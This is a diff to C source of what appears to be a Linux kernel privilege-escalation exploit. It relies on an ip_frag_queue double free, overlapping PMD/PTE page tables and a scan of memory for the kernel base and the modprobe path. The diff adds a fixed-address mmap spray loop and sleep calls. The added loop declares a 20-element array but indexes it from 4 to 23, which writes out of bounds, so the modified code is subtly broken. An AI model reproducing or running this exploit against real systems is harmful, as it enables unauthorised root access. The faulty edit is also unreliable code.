@@ -342,7 +342,11 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// causes end == offset in ip_frag_queue(). packet will be empty
 	// remains running until after both frees, a.k.a. does not require sleep
 	alloc_intermed_buf_hdr(0, &df_ip_header);
-
+	void *_pmd_area1[20];
+	for (int i=4; i < 24; i++){
+		_pmd_area1[i] = mmap((void*)PTI_TO_VIRT(1, i, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+		*(unsigned long long*)_pmd_area1[i] = 0xCAFEBABA;
+	}
 	// allocate overlapping PMD page (overlaps with PTE)
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
 
@@ -400,7 +404,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		for (unsigned long long j=0; j < 512; j++) 
 		{
 			unsigned long long phys_kernel_base;
-		
+			sleep(1);
 			// check for x64-gcc/clang signatures of kernel code segment at rest and at runtime
 			// - this "kernel base" is actually the assembly bytecode of start_64() and variants
 			// - it's different per architecture and per compiler (clang produces different signature than gcc)
@@ -419,6 +423,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
 			for (int i=0; i < 40; i++) 
 			{
+				sleep(1);
 				void *pmd_modprobe_addr;
 				unsigned long long phys_modprobe_addr;
 				unsigned long long modprobe_iteration_base;
